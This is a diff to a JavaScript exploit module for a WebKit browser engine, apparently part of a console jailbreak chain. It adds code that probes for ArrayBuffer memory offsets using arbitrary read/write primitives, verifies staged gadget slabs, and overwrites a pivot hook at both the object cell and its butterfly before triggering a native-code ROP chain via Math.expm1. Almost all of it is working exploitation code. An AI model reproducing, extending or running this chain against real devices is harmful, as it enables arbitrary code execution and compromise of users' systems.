@@ -107,10 +107,59 @@ function resolveGadgetsTrust(webkitBase, off) {
     return { G, bad: [] };
 }
 
-function bufAddr(p, off, ab) {
+function bufAddr(p, addrOff, ab) {
     const c = p.leakval(ab);
-    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
-        .add32(off.wk_ArrayBuffer_m_contents_m_data));
+    return p.read8(p.read8(c.add32(addrOff.implOff)).add32(addrOff.dataOff));
+}
+
+/** Prove DataView writes land at primitive read addr (wrong impl chain → N0 OOM). */
+function bufAddrRoundtrip(p, ab, implOff, dataOff) {
+    const cell = p.leakval(ab);
+    let impl = null;
+    let data = null;
+    try { impl = p.read8(cell.add32(implOff)); } catch (_) { return false; }
+    if (!impl || impl.hi === 0) return false;
+    try { data = p.read8(impl.add32(dataOff)); } catch (_) { return false; }
+    if (!data || data.hi === 0) return false;
+    const dv = new DataView(ab);
+    const marker = 0xdeadbabe;
+    dv.setUint32(0, marker, true);
+    let got = null;
+    try { got = p.read4(data); } catch (_) { return false; }
+    if (got !== marker) return false;
+    try { p.write4(data, new int64(0x600dc0de, 0)); } catch (_) { return false; }
+    return dv.getUint32(0, true) === 0x600dc0de;
+}
+
+const BUFADDR_IMPL_CAND = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30];
+const BUFADDR_DATA_CAND = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38];
+
+/** Find ArrayBuffer cell→impl→data chain where DV roundtrip matches primitive rw. */
+export function resolveBufAddrOff(p, off) {
+    if (!p || !off) return null;
+    const probe = new ArrayBuffer(0x20);
+    const tableImpl = off.wk_ArrayBuffer_m_impl;
+    const tableData = off.wk_ArrayBuffer_m_contents_m_data;
+    if (tableImpl != null && tableData != null
+        && bufAddrRoundtrip(p, probe, tableImpl, tableData)) {
+        return { implOff: tableImpl, dataOff: tableData, via: "table" };
+    }
+    for (let i = 0; i < BUFADDR_IMPL_CAND.length; i++) {
+        const implOff = BUFADDR_IMPL_CAND[i];
+        for (let j = 0; j < BUFADDR_DATA_CAND.length; j++) {
+            const dataOff = BUFADDR_DATA_CAND[j];
+            if (implOff === tableImpl && dataOff === tableData) continue;
+            if (bufAddrRoundtrip(p, probe, implOff, dataOff))
+                return { implOff, dataOff, via: "scan" };
+        }
+    }
+    return null;
+}
+
+function readDvU64(dv, at) {
+    const lo = dv.getUint32(at, true);
+    const hi = dv.getUint32(at + 4, true);
+    return new int64(lo, hi);
 }
 
 function put(dv, at, v) {
@@ -124,8 +173,8 @@ function put(dv, at, v) {
 }
 
 /** chain_poops makeCtx — store / pivot / stack / frame are separate ArrayBuffers. */
-function buildSlabCtx(p, off, G, keepAlive) {
-    const pivotSp = off.pivot_view_sp;
+function buildSlabCtx(p, addrOff, G, keepAlive, pivotSp) {
+    pivotSp = pivotSp != null ? pivotSp : 0x38;
     const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
     const sb = new ArrayBuffer(0x20);
     const pb = new ArrayBuffer(PB_SIZE);
@@ -138,10 +187,10 @@ function buildSlabCtx(p, off, G, keepAlive) {
     const frameDv = new DataView(fb);
     const stackU8 = new Uint8Array(kb);
     const frameU8 = new Uint8Array(fb);
-    const S = bufAddr(p, off, sb);
-    const P = bufAddr(p, off, pb);
-    const K = bufAddr(p, off, kb);
-    const F = bufAddr(p, off, fb);
+    const S = bufAddr(p, addrOff, sb);
+    const P = bufAddr(p, addrOff, pb);
+    const K = bufAddr(p, addrOff, kb);
+    const F = bufAddr(p, addrOff, fb);
     put(storeDv, 0x00, G.G1);
     put(storeDv, 0x08, P);
     put(storeDv, 0x10, G.G3);
@@ -166,6 +215,40 @@ function buildSlabCtx(p, off, G, keepAlive) {
     };
 }
 
+/** Memory at slab addrs must match DataView (bad bufAddr reads garbage but "ok"). */
+export function verifySlabContent(p, prep) {
+    const out = { ok: true, reasons: [] };
+    if (!prep || !prep.M || !prep.G)
+        return { ok: false, reasons: ["no prep"] };
+    const M = prep.M;
+    const G = prep.G;
+    function chk(label, memAddr, dv, dvOff, want) {
+        let mem = null;
+        try { mem = p.read8(memAddr); } catch (_) { mem = null; }
+        const staged = readDvU64(dv, dvOff);
+        const wantStr = String(want);
+        if (!mem || String(mem) !== wantStr)
+            out.reasons.push(label + " mem=" + mem + " want=" + wantStr);
+        if (String(staged) !== wantStr)
+            out.reasons.push(label + " dv=" + staged + " want=" + wantStr);
+    }
+    chk("S+0 G1", M.S, M.storeDv, 0x00, G.G1);
+    chk("S+8 P", M.S.add32(8), M.storeDv, 0x08, M.P);
+    chk("P+0 P", M.P, M.pivotDv, 0x00, M.P);
+    chk("P+10 G5", M.P.add32(0x10), M.pivotDv, 0x10, G.G5);
+    chk("P+20 G4", M.P.add32(0x20), M.pivotDv, 0x20, G.G4);
+    if (prep._layout && prep._layout.rsp != null) {
+        const sp = M.pivotSp;
+        let rspMem = null;
+        try { rspMem = p.read8(M.P.add32(sp)); } catch (_) { rspMem = null; }
+        if (!rspMem || String(rspMem) !== String(prep._layout.rsp))
+            out.reasons.push("P+0x" + sp.toString(16) + " rsp=" + rspMem
+                + " want=" + prep._layout.rsp);
+    }
+    out.ok = out.reasons.length === 0;
+    return out;
+}
+
 /** One ctx + pivot handles — call while heap is fresh (PRIMITIVE-OK). */
 export function prepNativeChain(p, off, webkitBase, cap) {
     if (!p || !off || !webkitBase)
@@ -174,8 +257,15 @@ export function prepNativeChain(p, off, webkitBase, cap) {
     if (!resolved.G || resolved.bad.length)
         throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
     const G = resolved.G;
+    const addrOff = resolveBufAddrOff(p, off);
+    if (!addrOff)
+        throw new Error("prepNativeChain: bufAddr roundtrip failed — ArrayBuffer impl chain");
+    const pivotSp = off.pivot_view_sp != null ? off.pivot_view_sp : 0x38;
     const keepAlive = [];
-    const M = buildSlabCtx(p, off, G, keepAlive);
+    const M = buildSlabCtx(p, addrOff, G, keepAlive, pivotSp);
+    const slabOk = verifySlabContent(p, { M, G });
+    if (!slabOk.ok)
+        throw new Error("prepNativeChain: slab content: " + slabOk.reasons.join("; "));
     let mainMf, mainOrig, pivotObj, pivotCell;
     if (cap && cap.mainMf && cap.mainOrig != null && cap.pivotCell) {
         mainMf = cap.mainMf;
@@ -204,6 +294,7 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         mainArmed: false,
         _pinMainMf: mainMf,
         _pinMainOrig: mainOrig,
+        _bufAddrOff: addrOff,
     };
 }
 
@@ -509,6 +600,42 @@ function writePivotHook(p, prep, off) {
     return site;
 }
 
+/** cell+0 and butterfly+0 — 13.52 may use rsi=butterfly-0x30 instead of pivotCell-0x30. */
+function writePivotHookDual(p, prep, off) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("writePivotHookDual: no prep");
+    if (!prep._bisect) prep._bisect = {};
+    const saved = [];
+    let hookOff = 0;
+    if (off && off.pivot_hook_off != null)
+        hookOff = off.pivot_hook_off;
+    const site0 = prep.pivotCell.add32(hookOff);
+    saved.push({ site: site0, off: hookOff, base: "cell", val: p.read8(site0) });
+    p.write8(site0, prep.M.S);
+    let bf = null;
+    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
+    if (bf && bf.hi > 0) {
+        saved.push({ site: bf, off: 0, base: "bf", val: p.read8(bf) });
+        p.write8(bf, prep.M.S);
+    }
+    prep._bisect.multiSaved = saved;
+    prep._bisect.pivotSite = site0;
+    prep._bisect.pivotSaved = saved[0].val;
+    return site0;
+}
+
+function restorePivotHook(p, prep) {
+    if (prep._bisect && prep._bisect.multiSaved) {
+        for (let i = 0; i < prep._bisect.multiSaved.length; i++) {
+            const e = prep._bisect.multiSaved[i];
+            if (e.val != null) p.write8(e.site, e.val);
+        }
+    } else if (prep._bisect && prep._bisect.pivotSaved != null) {
+        const site = prep._bisect.pivotSite || prep.pivotCell;
+        p.write8(site, prep._bisect.pivotSaved);
+    }
+}
+
 /** Swap G5 in live slab (try expm1+0x53642a if table G5 OOMs at fire). */
 export function patchPrepG5(prep, g5Addr) {
     if (!prep || !prep.M || !prep.G || !g5Addr)
@@ -569,6 +696,12 @@ export function bisectPreflight(p, prep) {
         if (!out.slab.K.ok) { out.ok = false; out.reasons.push("K unreadable (bufAddr?)"); }
         if (out.slab.rsp && !out.slab.rsp.ok)
             out.reasons.push("rsp unreadable (layout?)");
+        const content = verifySlabContent(p, prep);
+        out.slabContent = content;
+        if (!content.ok) {
+            out.ok = false;
+            out.reasons.push("slab content: " + content.reasons.join("; "));
+        }
     } catch (e) {
         out.ok = false;
         out.reasons.push("slab check: " + (e.message || e));
@@ -668,24 +801,35 @@ export function fireNativeCallBisect(p, prep, off) {
     return fireNativeCall(p, prep, off);
 }
 
-export function firePivotSmoke(p, prep, off) {
+export function firePivotSmoke(p, prep, off, opts) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("firePivotSmoke: no prep");
     layoutSmokeStack(prep);
-    return fireNativeCall(p, prep, off);
+    const content = verifySlabContent(p, prep);
+    if (!content.ok)
+        throw new Error("firePivotSmoke: slab content: " + content.reasons.join("; "));
+    return fireNativeCall(p, prep, off, opts);
 }
 
 /** chain_poops callAddr — no logging, no DOM. */
-export function fireNativeCall(p, prep, off) {
+export function fireNativeCall(p, prep, off, opts) {
     if (!prep || !prep.M)
         throw new Error("fireNativeCall: no prep");
+    opts = opts || {};
     if (!prep.mainArmed) {
         p.write8(prep.mainMf, prep.G.G0);
         prep.mainArmed = true;
     }
-    const site = writePivotHook(p, prep, off || {});
+    const hookMode = opts.hook || "dual";
+    if (hookMode === "bf") {
+        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS);
+    } else if (hookMode === "dual") {
+        writePivotHookDual(p, prep, off || {});
+    } else {
+        writePivotHook(p, prep, off || {});
+    }
     Math.expm1(prep.pivotObj);
-    p.write8(site, prep._bisect.pivotSaved);
+    restorePivotHook(p, prep);
     p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
     prep.staged = false;
